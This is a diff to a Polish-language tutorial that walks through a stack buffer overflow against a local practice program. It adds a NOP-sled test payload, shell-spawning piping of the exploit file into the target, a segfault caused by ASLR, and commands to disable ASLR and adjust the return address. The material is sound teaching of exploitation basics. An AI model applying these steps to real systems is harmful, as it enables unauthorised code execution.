@@ -72,7 +72,7 @@ Gdzie w pamięci leży bufor? Stos pływa, więc "strzelamy" w ciemno, używają
     python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*40 + b"A"*32 + b"BBBBBBBB")' > test.bin
     ```
     
-    *Wysłaliśmy: 40 NOPów + 32 litery 'A' (razem 72 bajty) + 8 liter 'B' jako adres powrotu.*
+    *Wysłaliśmy: 40 bajtów NOPów + 32 litery 'A' (razem 72 bajty) + 8 liter 'B' jako adres powrotu.*
 
 2.  **Karmimy program w GDB tym plikiem:**
     ```gdb
@@ -100,6 +100,11 @@ Gdzie w pamięci leży bufor? Stos pływa, więc "strzelamy" w ciemno, używają
 
 ### Krok 4: Konstrukcja Exploita (Python)
 
+```bash
+# 1. Generujemy ładunek do pliku
+python3 exploit.py > exploit.bin
+```
+
 ---
 
 ### Krok 5: Egzekucja (Magia rur - Pipes)
@@ -109,12 +114,7 @@ Jeśli po prostu zrobimy `./victim < exploit.bin`, program otworzy `/bin/sh`, al
 "Hakerski" trik z komendą `cat`:
 
 ```bash
-# 1. Generujemy ładunek do pliku
-python3 exploit.py > payload.bin
-
-# 2. Atakujemy! Nawiasy grupują wejście: najpierw leci nasz ładunek, 
-# a potem 'cat' bez argumentów przechwytuje naszą klawiaturę i przesyła do Shella!
-(cat payload.bin; cat) | ./victim
+(cat exploit.bin; cat) | ./victim
 ```
 
 **Wynik na ekranie:**
@@ -125,7 +125,37 @@ whoami
 ls -la
 ```
 *Zostaną wykonane komendy systemowe.*
-**Cel osiągnięty. HACKED.**
+**Ale nie !!! Segmentation fault (core dumped)**
 
+```bash
+dmesg | tail
+```
+
+### Rózne RSP - włączone ASLR (Losowanie Pamięci) - tego nie ma w gdb.
 ---
 
+Wyłaczamy i próbujemy szukać dalej (edukacyjnie)
+
+```bash
+setarch $(uname -m) -R /bin/bash
+```
+
+RSP do exploita, ale pomniejszony o 80 bajtów
+
+00007fffffffe5f0
+
+```bash
+python3 -c 'print(hex(0x00007fffffffe5f0 - 0x50))'
+```
+
+## I raz jeszcze
+
+```bash
+(cat exploit.bin; cat) | ./victim
+```
+
+Mimo braku znaku zachęty `$ `:
+```bash
+whoami
+ls -la
+```
